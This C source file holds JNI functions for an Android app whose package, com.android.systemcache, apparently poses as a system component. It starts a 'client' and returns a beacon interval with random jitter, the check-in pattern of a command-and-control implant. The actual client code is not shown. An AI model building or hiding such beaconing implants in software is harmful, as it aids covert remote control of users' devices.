#include <jni.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include "client.h"
#include "client_config.h"
#include "common.h"

static int64_t GetRandom(int64_t max_random);

/**
 * @brief Main network loop
 * 
 * @param[in] env JNI environment pointer
 * @param[in] thiz Java object reference
 * @return jlong Next beacon interval in seconds
 */
JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_syncData(JNIEnv* env, jobject thiz)
{
    client_config_t* config = NULL;
    int64_t next_interval = 86400;  // seconds in a day

    (void)env;
    (void)thiz;

    config = GetClientConfig();

    DPRINTF("STARTING CLIENT\n");
    StartClient(config);

    next_interval = (int64_t)config->beacon_interval + GetRandom(config->beacon_jitter);
    DPRINTF("NEXT INTERVAL %lld\n", (long long)next_interval);

    return next_interval;
}

/**
 * @brief Get initial random jitter interval
 * 
 * @param[in] env JNI environment pointer
 * @param[in] thiz Java object reference
 * @return jlong Random jitter interval in seconds
 */
JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_queryEnvironment(JNIEnv* env,
                                                                                 jobject thiz)

{
    (void)env;
    (void)thiz;
    // int64_t next_interval = -1;
    // client_config_t* config = NULL;
    // config = GetClientConfig();

    // next_interval = GetRandom(config->beacon_jitter);
    // if (0 > next_interval)
    // {
    //     next_interval = next_interval * (-1);
    // }
    // DPRINTF("NEXT INTERVAL %lld\n", (long long)next_interval);

    return 0;
}

/**
 * @brief Generate random number in range [-max_random, +max_random]
 * 
 * @param[in] max_random Maximum absolute value for random range
 * @return int64_t Random number in specified range
 */
static int64_t GetRandom(int64_t max_random)
{
    int64_t random;
    if (max_random == 0)
    {
        max_random = 100;
    }

    srand((unsigned int)time(NULL));

    random = rand() % (2 * max_random + 1);
    // shift to range [-max_random, +max_random]
    random -= max_random;

    return random;
}
